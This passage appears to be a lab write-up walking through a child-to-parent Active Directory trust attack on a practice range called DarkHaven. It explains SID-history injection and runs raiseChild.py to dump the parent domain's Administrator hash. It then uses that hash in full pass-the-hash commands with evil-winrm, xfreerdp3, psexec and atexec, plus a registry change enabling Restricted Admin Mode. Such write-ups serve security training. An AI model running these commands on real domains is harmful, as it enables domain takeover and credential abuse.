Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

```

If we can recall fromm above, we identified some trust relationship between [`dc.darkhaven.tech`](http://dc.darkhaven.tech) and `dc02.corp.darkhaven.tech` 

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2085.png)

## Enumerating Trust Relationships

https://www.thehacker.recipes/ad/movement/trusts/

```bash
PS C:\htb> Import-Module activedirectory
PS C:\htb> Get-ADTrust -Filter *
```

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2086.png)

- the IntraForest property shows that this is a ***child domain***  `IntraForest : True`
- trusts are set up to be `bidirectional,` meaning that users can authenticate back and forth across both trusts.

#### Attacking Domain Trusts - Child -> Parent Trusts - from Windows

The sidHistory attribute is used in migration scenarios. If a user in one domain is migrated to another domain, a new account is created in the second domain. The original user's SID will be added to the new user's SID history attribute, ensuring that the user can still access resources in the original domain.

SID history is intended to work across domains, but can work in the same domain. Using Mimikatz, an attacker can perform SID history injection and add an administrator account to the SID History attribute of an account they control. When logging in with this account, all of the SIDs associated with the account are added to the user's token.

This token is used to determine what resources the account can access. If the SID of a Domain Admin account is added to the SID History attribute of this account, then this account will be able to perform DCSync and create a Golden Ticket or a Kerberos ticket-granting ticket (TGT), which will allow for us to authenticate as any account in the domain of our choosing for further persistence.

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2087.png)

- This can be simplified by using raiseChild.py
    
    https://github.com/fortra/impacket/blob/master/examples/raiseChild.py
    

## Performing the Attack with [raiseChild.py](http://raisechild.py/)

```bash
 raiseChild.py -target-exec 10.10.10.4 corp.darkhaven.tech/ldap_svc
```

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2088.png)

- Obtained the Administrator hash for domain [darkhaven.tech](http://darkhaven.tech)

#### ***We can connect with Winrm and RDP***

```bash
evil-winrm -i dc.darkhaven.tech -u 'Administrator' -H b38a41e844c5c3d706c1e9e575f3e62c

xfreerdp3 /v:10.10.10.4 /u:Administrator /pth:b38a41e844c5c3d706c1e9e575f3e62c /cert:ignore /dynamic-resolution +clipboard /drive:$(pwd),share

```

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2089.png)

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2090.png)

- Windows frequently blocks remote administration logins (especially with high-privilege accounts like Administrator) unless **Restricted Admin Mode** is enabled.
- We can use a similar technique we used on ***Anomaly***

```bash
impacket-psexec -hashes ':b38a41e844c5c3d706c1e9e575f3e62c' 'darkhaven.tech/Administrator@10.10.10.4' "reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f"

impacket-atexec -hashes ':b38a41e844c5c3d706c1e9e575f3e62c' 'darkhaven.tech/Administrator@10.10.10.4' "reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f"

xfreerdp3 /v:10.10.10.4 /u:Administrator /pth:b38a41e844c5c3d706c1e9e575f3e62c /cert:ignore /dynamic-resolution +clipboard /drive:$(pwd),share
```

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2091.png)

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2092.png)
